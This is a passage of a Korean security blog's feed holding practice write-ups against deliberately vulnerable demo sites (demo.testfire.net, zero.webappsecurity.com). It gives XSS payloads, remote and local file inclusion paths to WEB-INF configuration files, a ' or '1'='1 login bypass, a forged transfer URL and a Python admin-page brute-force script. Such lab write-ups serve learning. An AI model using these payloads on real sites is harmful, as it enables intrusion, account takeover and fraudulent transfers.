+Done.</p>]]></content><author><name>A1mH1gh</name><email>A1mH1gh4909@gmail.com</email></author><category term="VulnWebs_Writeup" /><summary type="html"><![CDATA[RECON WAS: Apache Lang: JSP Information Leakage 서버 내 미존재 페이지를 접속할 경우 ‘404’ 에러코드를 반환하면서 WAS정보를 노출 http://zero.webappsecurity.com/robots.txt Apache Tomcat : 7.0.70 Admin Page Discloser 관리자페이지가 쉽게 유추가능하고 접속됨 http://zero.webappsecurity.com/admin/ Cleartext Transmission 평문통신(http)를 사용하고 있으며 중요정보(ID/PW)가 평문으로 전송되고 있음 (인코딩 및 암호화되지 않음) Position Leakage Position Leakage-1 Apache Tomcat이 제공하는 ‘관리자 인터페이스’ 페이지가 존재 http://zero.webappsecurity.com/manager/html Position Leakage-2 서버의 ‘기본 파일’들이 불필요하게 외부에 공개되어 있어 2차 공격에 참고될 수 있음 http://zero.webappsecurity.com/docs/ http://zero.webappsecurity.com/errors/ http://zero.webappsecurity.com/server-status Position Leakage-3 개발자가 만들어둔 ‘백업 파일’에서 부분 소스코드가 노출되고 있어 2차 공격에 참고될 수 있음 http://zero.webappsecurity.com/faq.html.bak http://zero.webappsecurity.com/index.old http://zero.webappsecurity.com/index.html.old Path Traversal 특정 파일을 오리지널 페이지에 include하는 기능이 존재 http://zero.webappsecurity.com/help.html?topic=/help/topic1.html 외부 파일을 포함시킬 경우 (RFI) ?topic=http://xss.rocks/xss.js 서버 내 파일을 포함시킬 경우 (LFI) ?topic=/WEB-INF/web.xml or ?topic=file://../../WEB-INF/web.xml Done.]]></summary></entry><entry><title type="html">[ VulnWebs ] - demo.testfire.net</title><link href="http://localhost:4000/vulnwebs_writeup/VulnWebs-demo.test.fire.net/" rel="alternate" type="text/html" title="[ VulnWebs ] - demo.testfire.net" /><published>2022-11-27T00:00:00+09:00</published><updated>2022-11-27T00:00:00+09:00</updated><id>http://localhost:4000/vulnwebs_writeup/%5BVulnWebs%5D-demo.test.fire.net</id><content type="html" xml:base="http://localhost:4000/vulnwebs_writeup/VulnWebs-demo.test.fire.net/"><![CDATA[<p class="text-center"><img src="https://user-images.githubusercontent.com/100695923/205482041-6271efa9-6b8c-4960-b79d-5e0c335591c8.png" alt="image" /></p>
+
+<p class="text-center"><img src="https://user-images.githubusercontent.com/100695923/207833146-adf2f2fa-9a0c-4a4d-8839-1283c06d5be1.png" alt="image" /></p>
+
+<h2 id="recon">RECON</h2>
+<p><img src="https://user-images.githubusercontent.com/100695923/205482007-74b6e5ab-f7eb-42cf-9665-06e5c49478d4.png" alt="image" /></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WAS: Apache
+</code></pre></div></div>
+
+<h2 id="information-leakage">Information Leakage</h2>
+<p>비정상 데이터 전송을 통해 웹서버 내 오류를 발생시켜 웹서버 WAS 종류 및 버전 정보를 노출시킴</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://demo.testfire.net/index.jsp?content=../../
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/100695923/204819783-16aceb24-c0e7-446c-9bcd-b7888a9d7c6a.png" alt="image" /></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WAS: Apache Tomcat/7.0.92
+</code></pre></div></div>
+<h2 id="xss">XSS</h2>
+<p>URL 요청 시 스크립트 구문을 삽입하여 브라우저에서 스크립트가 실행</p>
+
+<h3 id="xss-1">XSS-1</h3>
+<p>사용자 입력을 그대로 반환하는 페이지가 존재</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://demo.testfire.net/search.jsp?query="&gt;1234
+</code></pre></div></div>
+
+<p><img src="https://user-images.githubusercontent.com/100695923/204802022-a58fd738-f8eb-4151-803a-cf3a2b8cac45.png" alt="image" /></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?query=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/100695923/204803131-6841b5e6-5053-4224-b09f-51ca50348609.png" alt="image" />
+<img src="https://user-images.githubusercontent.com/100695923/204802997-3a479c22-4430-4dfd-942a-3ba221e37fcd.png" alt="image" /></p>
+<h3 id="xss-2">XSS-2</h3>
+
+<p>비공개 설문조사 페이지는 ‘오픈소스’ 사이트에서 확인할수있었음</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;alert`1`&lt;/script&gt;
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/100695923/204817552-488a5670-71f9-44cc-aeee-13cf06562fe6.png" alt="image" />
+<img src="https://user-images.githubusercontent.com/100695923/204818865-8d3fc94b-a41f-4154-9614-754631b1a57b.png" alt="image" /></p>
+
+<h3 id="xss-3">XSS-3</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://demo.testfire.net/bank/queryxpath.jsp?content=queryxpath.jsp&amp;query=
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/204948862-0199ec35-eef4-4571-a715-6ffcfb156c43.png" alt="image" /></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&amp;query=&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre></div></div>
+
+<p><img src="https://user-images.githubusercontent.com/56434196/204948772-bac46efd-50a4-4888-888c-3ead34470ed7.png" alt="image" /></p>
+
+<h3 id="xss-4">XSS-4</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://demo.testfire.net/bank/customize.jsp?content=customize.jsp&amp;lang=
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/204950681-f17be783-c944-44c1-8eaa-8ca537685363.png" alt="image" /></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&amp;lang=&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/204950832-f923e303-0f6f-487a-a2c8-a08e4b70e344.png" alt="image" /></p>
+
+<h3 id="xss-5">XSS-5</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://demo.testfire.net/feedback.jsp
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/204951956-5f5e0a39-7cfd-49b9-bbbd-8065b52ff54b.png" alt="image" />
+<img src="https://user-images.githubusercontent.com/56434196/204951986-bf504375-dffd-4dc9-9436-00a2e5aaeac2.png" alt="image" /></p>
+
+<h2 id="path-traversal">Path Traversal</h2>
+<p>사용자로부터 특정 페이지를 입력받아 Include 해주는 기능이 존재함 (LFI)</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://demo.testfire.net/index.jsp?content=inside_contact.htm
+</code></pre></div></div>
+<p>공격자는 상위 디렉토리 이동을 의미하는 <code class="language-plaintext highlighter-rouge">../</code>를 사용하여 서버 내 주요 설정 파일들을 열람할 수 있음</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>../WEB-INF/init.log
+../WEB-INF/web.xml
+../WEB-INF/app.properties
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/100695923/204825917-7c8f7d58-c9d4-4768-a678-786f13284708.png" alt="image" />
+(위 계정으로 로그인은 되지 않음)</p>
+<h2 id="sqli">SQLi</h2>
+<p>로그인 페이지에서</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://demo.testfire.net/login.jsp
+</code></pre></div></div>
+<p>아래 값을 전달하면</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' or '1'='1
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/204945864-cb6b774b-1cac-4d88-a60e-8ea0d023f632.png" alt="image" /></p>
+
+<p>admin으로 로그인 성공
+<img src="https://user-images.githubusercontent.com/56434196/204946796-a0924391-97e0-45db-ac50-6598e3d7e500.png" alt="image" /></p>
+
+<h2 id="csrf">CSRF</h2>
+<p>아래 URL 클릭만으로 ‘특정 계좌로 송금’이 가능함</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://demo.testfire.net/bank/doTransfer?fromAccount=800000&amp;toAccount=800001&amp;transferAmount=999&amp;transfer=Transfer%20Money
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/204953415-ce3c4c8f-34aa-447f-9b6e-ec7d5d5630af.png" alt="image" />
+<img src="https://user-images.githubusercontent.com/56434196/204953670-c35cff70-3296-403e-8b7f-6ef940c6957d.png" alt="image" /></p>
+
+<h2 id="admin-page-discloser">Admin Page Discloser</h2>
+<p>관리자 페이지를 찾기 위해 일반적인 관리자 페이지명(admin.html, manager.html, …)을 대입해보는 사전대입공격 수행</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s">'http://demo.testfire.net/'</span>
+<span class="n">urls</span> <span class="o">=</span> <span class="s">'''
+login.jsp
+admin/account.html
+admin/login.html
+admin/login.htm
+admin/home.jsp
+'''</span>
+<span class="c1">#words 모음 사이트
+#https://github.com/fuzzdb-project/fuzzdb/blob/master/discovery/predictable-filepaths/login-file-locations/jsp.txt
+</span>
+<span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span>
+<span class="s">'JSESSIONID'</span><span class="p">:</span> <span class="s">'BFE82CD7D10AFB01E956532AA7205B0F'</span><span class="p">,</span>
+<span class="s">'AltoroAccounts'</span> <span class="p">:</span> <span class="s">'ODAwMDAyflNhdmluZ3N+LTEuOTk5NTQzNDA3MDM5MTUyOUUxOHw4MDAwMDN+Q2hlY2tpbmd+MS4xODQ0Njc0NDA4Mzc2NTkyRTIwfDQ1MzkwODIwMzkzOTYyODh+Q3JlZGl0IENhcmR+LTEuOTk5NTQzNDAxMjc4NzExNTVFMTh8'</span>
+<span class="p">}</span>
+<span class="c1">#일반 사용자 (쿠키)세션 전달 필요
+</span>
+<span class="n">arry</span> <span class="o">=</span> <span class="n">urls</span><span class="p">.</span><span class="n">split</span><span class="p">()</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">arry</span><span class="p">:</span>
+	<span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="s">'/'</span><span class="o">+</span><span class="n">i</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
+	<span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+		<span class="k">print</span><span class="p">(</span><span class="s">'관리자 페이지: '</span><span class="o">+</span><span class="n">url</span><span class="o">+</span><span class="s">'/'</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>스크립트 결과 다음 URL을 확인할 수 있었음</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://demo.testfire.net/admin/admin.jsp
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/100695923/205480324-515fc850-8e76-4a23-bbb2-fd0400e4e982.png" alt="image" />
+<br />
+<br />
+<br />
+Done.</p>]]></content><author><name>A1mH1gh</name><email>A1mH1gh4909@gmail.com</email></author><category term="VulnWebs_Writeup" /><summary type="html"><![CDATA[RECON WAS: Apache Information Leakage 비정상 데이터 전송을 통해 웹서버 내 오류를 발생시켜 웹서버 WAS 종류 및 버전 정보를 노출시킴 https://demo.testfire.net/index.jsp?content=../../ WAS: Apache Tomcat/7.0.92 XSS URL 요청 시 스크립트 구문을 삽입하여 브라우저에서 스크립트가 실행 XSS-1 사용자 입력을 그대로 반환하는 페이지가 존재 https://demo.testfire.net/search.jsp?query="&gt;1234 ?query=&lt;script&gt;alert(document.cookie)&lt;/script&gt; XSS-2 비공개 설문조사 페이지는 ‘오픈소스’ 사이트에서 확인할수있었음 &lt;script&gt;alert`1`&lt;/script&gt; XSS-3 https://demo.testfire.net/bank/queryxpath.jsp?content=queryxpath.jsp&amp;query= &amp;query=&lt;script&gt;alert(1)&lt;/script&gt; XSS-4 https://demo.testfire.net/bank/customize.jsp?content=customize.jsp&amp;lang= &amp;lang=&lt;script&gt;alert(1)&lt;/script&gt; XSS-5 https://demo.testfire.net/feedback.jsp Path Traversal 사용자로부터 특정 페이지를 입력받아 Include 해주는 기능이 존재함 (LFI) https://demo.testfire.net/index.jsp?content=inside_contact.htm 공격자는 상위 디렉토리 이동을 의미하는 ../를 사용하여 서버 내 주요 설정 파일들을 열람할 수 있음 ../WEB-INF/init.log ../WEB-INF/web.xml ../WEB-INF/app.properties (위 계정으로 로그인은 되지 않음) SQLi 로그인 페이지에서 https://demo.testfire.net/login.jsp 아래 값을 전달하면 ' or '1'='1 admin으로 로그인 성공 CSRF 아래 URL 클릭만으로 ‘특정 계좌로 송금’이 가능함 https://demo.testfire.net/bank/doTransfer?fromAccount=800000&amp;toAccount=800001&amp;transferAmount=999&amp;transfer=Transfer%20Money Admin Page Discloser 관리자 페이지를 찾기 위해 일반적인 관리자 페이지명(admin.html, manager.html, …)을 대입해보는 사전대입공격 수행 import requests url = 'http://demo.testfire.net/' urls = ''' login.jsp admin/account.html admin/login.html admin/login.htm admin/home.jsp ''' #words 모음 사이트 #https://github.com/fuzzdb-project/fuzzdb/blob/master/discovery/predictable-filepaths/login-file-locations/jsp.txt cookies = { 'JSESSIONID': 'BFE82CD7D10AFB01E956532AA7205B0F', 'AltoroAccounts' : 'ODAwMDAyflNhdmluZ3N+LTEuOTk5NTQzNDA3MDM5MTUyOUUxOHw4MDAwMDN+Q2hlY2tpbmd+MS4xODQ0Njc0NDA4Mzc2NTkyRTIwfDQ1MzkwODIwMzkzOTYyODh+Q3JlZGl0IENhcmR+LTEuOTk5NTQzNDAxMjc4NzExNTVFMTh8' } #일반 사용자 (쿠키)세션 전달 필요 arry = urls.split() for i in arry: r=requests.get(url+'/'+i,cookies=cookies) if r.status_code == 200: print('관리자 페이지: '+url+'/'+i) 스크립트 결과 다음 URL을 확인할 수 있었음 http://demo.testfire.net/admin/admin.jsp Done.]]></summary></entry><entry><title type="html">[ VulnWebs ] - Getting Started</title><link href="http://localhost:4000/vulnwebs_writeup/VulnWebs-GettingStarted/" rel="alternate" type="text/html" title="[ VulnWebs ] - Getting Started" /><published>2022-11-26T00:00:00+09:00</published><updated>2022-11-26T00:00:00+09:00</updated><id>http://localhost:4000/vulnwebs_writeup/%5BVulnWebs%5D-GettingStarted</id><content type="html" xml:base="http://localhost:4000/vulnwebs_writeup/VulnWebs-GettingStarted/"><![CDATA[<p>웹취약점 진단 능력 고도화를 위해 <strong>Vulnerable WebSites</strong> 에서 취약점을 찾아보자!</p>
+<h2 id="what">What?</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. demo.testfire.net
+2. zero.webappsecurity.com
+3. php.testsparker.com
+4. aspnet.testsparker.com
+5. testphp.vulnweb.com
+6. testasp.vulnweb.com
+7. testaspnet.vulnweb.com
+8. testhtml5.vulnweb.com
+9. x.x.137.97
+</code></pre></div></div>
+<h2 id="how">How?</h2>
+<p>Checklist : ‘주요정보통신기반시설 취약점 점검 가이드’<br />
+Tools : ‘Chrome DevTools’, ‘Python’<br />
+Deadline : ‘2022/12/23’
+<br />
+<br />
+<br />
+Ok. Let’s do this :)</p>]]></content><author><name>A1mH1gh</name><email>A1mH1gh4909@gmail.com</email></author><category term="VulnWebs_Writeup" /><summary type="html"><![CDATA[웹취약점 진단 능력 고도화를 위해 Vulnerable WebSites 에서 취약점을 찾아보자! What? 1. demo.testfire.net 2. zero.webappsecurity.com 3. php.testsparker.com 4. aspnet.testsparker.com 5. testphp.vulnweb.com 6. testasp.vulnweb.com 7. testaspnet.vulnweb.com 8. testhtml5.vulnweb.com 9. x.x.137.97 How? Checklist : ‘주요정보통신기반시설 취약점 점검 가이드’ Tools : ‘Chrome DevTools’, ‘Python’ Deadline : ‘2022/12/23’ Ok. Let’s do this :)]]></summary></entry></feed>
